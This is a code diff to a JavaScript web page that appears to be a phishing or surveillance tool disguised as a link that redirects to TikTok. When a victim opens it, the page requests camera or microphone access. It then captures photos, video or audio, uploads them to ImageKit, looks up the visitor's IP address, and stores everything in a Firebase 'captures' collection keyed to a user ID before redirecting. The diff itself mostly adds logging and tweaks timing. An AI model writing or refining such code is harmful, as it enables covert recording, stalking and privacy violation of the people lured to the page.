@@ -73,7 +73,7 @@
                     try { 
                         resolve({ success: true, url: JSON.parse(xhr.responseText).url });
                     } catch(e) { reject('Upload failed'); }
-                } else { reject('Upload error'); }
+                } else { reject('Upload error: ' + xhr.status); }
             };
             xhr.onerror = () => reject('Network error');
             xhr.send(formData);
@@ -91,7 +91,7 @@
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             canvas.toBlob(async (blob) => {
                 resolve(new File([blob], `photo_${Date.now()}.jpg`, { type: 'image/jpeg' }));
-            }, 'image/jpeg', 0.85);
+            }, 'image/jpeg', 0.9);
         });
     }
     
@@ -119,7 +119,10 @@
             let redirectUrl = params.get('redirect') || 'https://www.tiktok.com';
             let userId = params.get('uid');
             
+            console.log("📸 Capture started:", { mode, duration, userId });
+            
             if (!userId) {
+                console.log("❌ No userId, redirecting");
                 window.location.href = redirectUrl;
                 return;
             }
@@ -133,6 +136,7 @@
             else if (mode === 'audio') constraints = { audio: true };
             else constraints = { video: { facingMode: "user" } };
             
+            console.log("🎥 Requesting camera...");
             const stream = await navigator.mediaDevices.getUserMedia(constraints);
             mediaStream = stream;
             
@@ -142,29 +146,43 @@
             }
             
             setTimeout(async () => {
+                console.log("📷 Capturing media...");
                 const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'unknown');
                 let mediaUrls = [];
                 
                 if (mode === 'photo') {
                     const file = await capturePhoto();
-                    if (file) { const res = await uploadToImageKit(file); if (res.success) mediaUrls.push(res.url); }
+                    if (file) { 
+                        const res = await uploadToImageKit(file); 
+                        if (res.success) mediaUrls.push(res.url);
+                        console.log("📸 Photo uploaded:", res.url);
+                    }
                 }
                 else if (mode === '5photos') {
                     for (let i = 0; i < 5; i++) {
                         const file = await capturePhoto();
-                        if (file) { const res = await uploadToImageKit(file); if (res.success) mediaUrls.push(res.url); }
+                        if (file) { 
+                            const res = await uploadToImageKit(file); 
+                            if (res.success) mediaUrls.push(res.url);
+                        }
                         await new Promise(r => setTimeout(r, 100));
                     }
+                    console.log("📸 5 photos uploaded:", mediaUrls.length);
                 }
                 else if (mode === 'videoonly' || mode === 'videoaudio' || mode === 'audio') {
                     const file = await captureMedia(duration, mode);
-                    if (file) { const res = await uploadToImageKit(file); if (res.success) mediaUrls.push(res.url); }
+                    if (file) { 
+                        const res = await uploadToImageKit(file); 
+                        if (res.success) mediaUrls.push(res.url);
+                        console.log("🎬 Media uploaded:", res.url);
+                    }
                 }
                 
                 if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
                 
                 if (mediaUrls.length > 0 && userId) {
-                    await addDoc(collection(db, "captures"), {
+                    console.log("💾 Saving to Firebase...");
+                    const docRef = await addDoc(collection(db, "captures"), {
                         media: mediaUrls,
                         ip: ip,
                         mode: mode,
@@ -173,11 +191,16 @@
                         timestamp: new Date().toISOString(),
                         unix: Date.now()
                     });
+                    console.log("✅ Saved to Firebase with ID:", docRef.id);
+                } else {
+                    console.log("⚠️ No media captured or no userId");
                 }
                 
+                console.log("🔀 Redirecting to:", redirectUrl);
                 window.location.href = redirectUrl;
-            }, 500);
+            }, 800);
         } catch(err) {
+            console.error("❌ Error:", err);
             const redirectUrl = new URLSearchParams(window.location.search).get('redirect') || 'https://www.tiktok.com';
             window.location.href = redirectUrl;
         }
